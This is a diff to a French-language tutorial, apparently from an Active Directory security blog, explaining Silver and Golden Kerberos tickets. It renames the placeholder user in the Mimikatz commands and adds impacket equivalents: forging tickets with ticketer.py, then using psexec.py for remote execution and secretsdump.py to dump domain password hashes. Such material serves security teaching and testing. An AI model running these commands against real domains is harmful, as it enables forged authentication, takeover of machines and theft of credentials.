@@ -125,11 +125,28 @@ En pratique, voici une capture d'écran qui montre la création d'un Silver Tick
 La ligne de commande utilisée dans Mimikatz est la suivante :
 
 ```
-/kerberos::golden /domain:adsec.local /user:ANY /sid:S-1-5-21-1423455951-1752654185-1824483205 /rc4:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /target:DESKTOP-01.adsec.local /service:cifs /ptt
+/kerberos::golden /domain:adsec.local /user:random_user /sid:S-1-5-21-1423455951-1752654185-1824483205 /rc4:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /target:DESKTOP-01.adsec.local /service:cifs /ptt
 ```
 
-Cela veut dire qu'on crée un ticket pour le domaine `adsec.local` avec un nom d'utilisateur **arbitraire** (`ANY`), et que l'on vise le service `CIFS` de la machine `DESKTOP-01` en fournissant son hash NTLM.
+Cela veut dire qu'on crée un ticket pour le domaine `adsec.local` avec un nom d'utilisateur **arbitraire** (`random_user`), et que l'on vise le service `CIFS` de la machine `DESKTOP-01` en fournissant son hash NTLM.
 
+Il est également possible de créer un Silver Ticket sous linux en utilisant [impaket](https://github.com/SecureAuthCorp/impacket), via l'outil `ticketer.py`.
+
+```bash
+ticketer.py -nthash ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx -domain-sid S-1-5-21-1423455951-1752654185-1824483205 -domain adsec.local -spn CIFS/DESKTOP-01.adsec.local random_user
+``` 
+
+Il faut ensuite exporter le chemin du ticket dans une variable d'environnement spéciale `KRB5CCNAME`
+
+```bash
+export KRB5CCNAME='/chemin/vers/random_user.ccache'
+```
+
+Enfin, tous les outils de la suite `impacket` peuvent être utilisés avec ce ticket, via l'option `-k`
+
+```bash
+psexec.py -k DESKTOP-01.adsec.local
+```
 
 ## Golden Ticket
 
@@ -156,13 +173,31 @@ On génère alors le **Golden Ticket** en utilisant le hash NTLM du compte `krbt
 La ligne de commande utilisée dans Mimikatz est la suivante :
 
 ```
-/kerberos::golden /domain:adsec.local /user:ANYUSER /sid:S-1-5-21-1423455951-1752654185-1824483205 /krbtgt:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /ptt
+/kerberos::golden /domain:adsec.local /user:random_user /sid:S-1-5-21-1423455951-1752654185-1824483205 /krbtgt:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /ptt
 ```
-Cela veut dire qu'on crée un ticket pour le domaine `adsec.local` avec un nom d'utilisateur **arbitraire** (`ANYUSER`), en fournissant le hash NTLM de l'utilisateur `krbtgt`. Cette commande crée un TGT avec une PAC indiquant que nous sommes administrateur du domaine (entre autre), et que nous nous appelons ANYUSER (choisi arbitrairement).
+Cela veut dire qu'on crée un ticket pour le domaine `adsec.local` avec un nom d'utilisateur **arbitraire** (`random_user`), en fournissant le hash NTLM de l'utilisateur `krbtgt`. Cette commande crée un TGT avec une PAC indiquant que nous sommes administrateur du domaine (entre autre), et que nous nous appelons ANYUSER (choisi arbitrairement).
 
 Une fois ce ticket en mémoire, notre session est en mesure de demander un TGS pour n'importe quel [SPN](/service-principal-name-spn), par exemple pour `CIFS\DC-01.adsec.local` permettant de lire le contenu du partage `\\DC-01.adsec.local\$`
 
 [![GT granted](/assets/uploads/2019/03/golden_ticket_access_granted.png)](/assets/uploads/2019/03/golden_ticket_access_granted.png)
+
+Il est également possible de créer un Golden Ticket sous linux en utilisant [impaket](https://github.com/SecureAuthCorp/impacket), via l'outil `ticketer.py`.
+
+```bash
+ticketer.py -nthash ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx -domain-sid S-1-5-21-1423455951-1752654185-1824483205 -domain adsec.local random_user
+``` 
+
+Il faut ensuite exporter le chemin du ticket dans une variable d'environnement spéciale `KRB5CCNAME`
+
+```bash
+export KRB5CCNAME='/chemin/vers/random_user.ccache'
+```
+
+Enfin, tous les outils de la suite `impacket` peuvent être utilisés avec ce ticket, via l'option `-k`
+
+```bash
+secretsdump.py -k DC-01.adsec.local -just-dc-ntlm -just-dc-user 
+```
 
 
 ## Méthodes de chiffrement
